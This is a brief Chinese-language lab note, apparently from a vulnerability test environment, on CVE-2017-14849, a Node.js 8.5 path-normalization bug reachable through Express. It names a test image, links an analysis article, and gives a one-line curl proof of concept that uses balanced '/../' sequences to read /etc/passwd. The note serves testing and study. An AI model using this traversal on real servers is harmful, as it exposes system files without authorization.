## nodejs 8.5 normalize 路径解析错误漏洞

测试镜像

* src/node-express/4.13.1/

参考文章

* [Node.js CVE-2017-14849 漏洞分析](https://security.tencent.com/index.php/blog/msg/121)

Poc - 保证两边的 `/../` 数量一样

```
curl 127.0.0.1/js/../../../../../../a/../../../../../../etc/passwd
```


